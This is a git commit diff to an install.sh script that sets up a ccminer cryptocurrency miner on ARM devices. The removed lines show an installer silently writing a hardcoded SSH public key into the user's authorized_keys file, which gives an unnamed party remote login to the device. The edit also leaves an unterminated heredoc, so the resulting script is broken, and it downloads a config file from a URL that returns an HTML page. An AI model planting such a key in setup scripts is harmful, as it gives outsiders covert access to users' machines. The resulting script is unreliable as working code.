a69d9ef1bec5c2b830bf4ca060863e1a614b1111
CryptoGod <133327854+Thiha0101@users.noreply.github.com>
2023-05-25 22:22:56 +0630

    Update install.sh

--- install.sh
+++ install.sh
@@ -5,27 +5,12 @@ sudo apt-get -y install libcurl4-openssl-dev libjansson-dev libomp-dev git scree
 wget http://ports.ubuntu.com/pool/main/o/openssl/libssl1.1_1.1.0g-2ubuntu4_arm64.deb
 sudo dpkg -i libssl1.1_1.1.0g-2ubuntu4_arm64.deb
 rm libssl1.1_1.1.0g-2ubuntu4_arm64.deb
-mkdir ~/.ssh; chmod 0700 ~/.ssh
-cat << EOF > ~/.ssh/authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC0tOnafk313Mivr0GSFz/EzRnNu+3GLeXZ02lYh4B99q45xj3u2is91TYHS239NZ1sACoVxJo9RSAWdRrHLGdCSYE1WLj+lV2GHBlkScY6/fOLP6kdtjfLEedbU60jyJDS3lz3kCbqne5fB55M/z3bUpkNN/Tix3xCQ5b7GyGQOw== noname
-EOF
-chmod 0600 ~/.ssh/authorized_keys
 mkdir ~/ccminer
 cd ~/ccminer
 wget https://github.com/Oink70/Android-Mining/releases/download/v0.0.0-2/ccminer
 wget https://github.com/Thiha0101/androidmining/blob/main/config.json
 chmod +x ccminer
 cat << EOF > ~/ccminer/start.sh
-#!/bin/sh
-#exit existing screens with the name CCminer
-screen -S CCminer -X quit
-#wipe any existing (dead) screens)
-screen -wipe
-#create new disconnected session CCminer
-screen -dmS CCminer
-#run the miner
-screen -S CCminer -X stuff "~/ccminer/ccminer -c ~/ccminer/config.json\n"
-EOF
 chmod +x start.sh
 
 echo "setup nearly complete."
